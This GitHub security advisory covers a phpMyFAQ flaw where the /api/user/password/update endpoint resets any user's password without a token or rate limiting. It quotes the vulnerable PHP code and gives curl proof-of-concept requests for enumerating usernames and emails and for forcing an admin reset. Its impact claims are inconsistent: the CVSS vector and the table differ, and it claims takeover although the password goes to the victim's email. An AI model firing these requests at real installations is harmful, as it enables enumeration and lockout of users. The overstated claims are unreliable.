# [H] phpMyFAQ: Missing Password Reset Token Allows Account Takeover via Username/Email Enumeration

## Summary
Severity: High
Advisory: GHSA-w9xh-5f39-vq89
CVE: CVE-2026-35675
CWE: CWE-307, CWE-359, CWE-640
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-05-20
Source: https://github.com/advisories/GHSA-w9xh-5f39-vq89
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.3
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.3

## Details
### Summary
An authentication bypass vulnerability in phpMyFAQ allows any unauthenticated attacker to reset the password of any user account, including SuperAdmin accounts. By sending a PUT request with just a valid username and associated email address to /api/user/password/update, an attacker receives a new plaintext password via email without any token verification, rate limiting, or email confirmation. This enables complete account takeover of any user, including full administrative access.


### Details
File: phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/UnauthorizedUserController.php
Lines: 56-130
The updatePassword() method at line 56 accepts PUT requests to /user/password/update with only username and email in the JSON body:
#[Route(path: 'user/password/update', name: 'api.private.user.password', methods: ['PUT'])]
```php
public function updatePassword(Request $request): JsonResponse
{
    $data = json_decode($request->getContent());
    $username = trim((string) Filter::filterVar($data->username, FILTER_SANITIZE_SPECIAL_CHARS));
    $email = trim((string) Filter::filterEmail($data->email));
    if ($username !== '' && $username !== '0' && ($email !== '' && $email !== '0')) {
        $user = ($this->currentUserFactory ?? CurrentUser::getCurrentUser(...))($this->configuration);
        $loginExist = $user->getUserByLogin($username);
        if ($loginExist && $email === $user->getUserData('email')) {
            // NO TOKEN CHECK
            // NO RATE LIMITING
            // NO EMAIL VERIFICATION
            $newPassword = $user->createPassword();
            $user->changePassword($newPassword);
            $mail->send(); // New password sent in plaintext
        }
    }
}


```

### Root Causes:
1. No time-limited cryptographic token required for password reset
2. No rate limiting on the endpoint (allows unlimited username/email enumeration)
3. No verification email sent to original address before reset
4. New password sent in plaintext email without any confirmation step


### PoC
Prerequisites: None (unauthenticated attack)
Step 1 - Username/Email Enumeration (no rate limiting):
Test with wrong email - reveals if user exists
```bash
curl -X PUT -H "Content-Type: application/json" \
  -d '{"username":"admin","email":"wrong@test.com"}' \
  http://target/phpmyfaq/api/user/password/update
```
Response: {"error":"The email doesn't exist..."}  <- user exists but wrong email

OR

Response: {"error":"The user doesn't exist"}     <- user doesn't exist

Step 2 - Password Reset (no token required):
```bash
curl -X PUT -H "Content-Type: application/json" \
  -d '{"username":"admin","email":"admin@target.com"}' \
  http://target/phpmyfaq/api/user/password/update
```

Response: {"success":"Email has been sent."}
The new plaintext password is sent to admin@target.com

Step 3 - Account Takeover:
Attacker now has valid credentials and can log in as SuperAdmin.



### Impact
Aspect	Details
Vulnerability Type	Authentication Bypass / Weak Password Recovery Mechanism (CWE-640)
Attack Vector	Network (unauthenticated HTTP request)
Privileges Required	None
User Interaction	None
Scope	Full administrative access to phpMyFAQ
Confidentiality	High - attacker gains full access to all user data and FAQ content
Integrity	High - attacker can modify all content and settings
Availability	High - attacker can lock out legitimate users
Who is Impacted:
- All phpMyFAQ administrators using default installations
- Any organization using phpMyFAQ for internal knowledge bases
- End users whose accounts could be compromised
- Organizations relying on phpMyFAQ for customer support FAQs
Attack Complexity: Very Low - no special knowledge or conditions required beyond knowing/guessing a valid username and associated email address

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-w9xh-5f39-vq89
- https://github.com/thorsten/phpMyFAQ
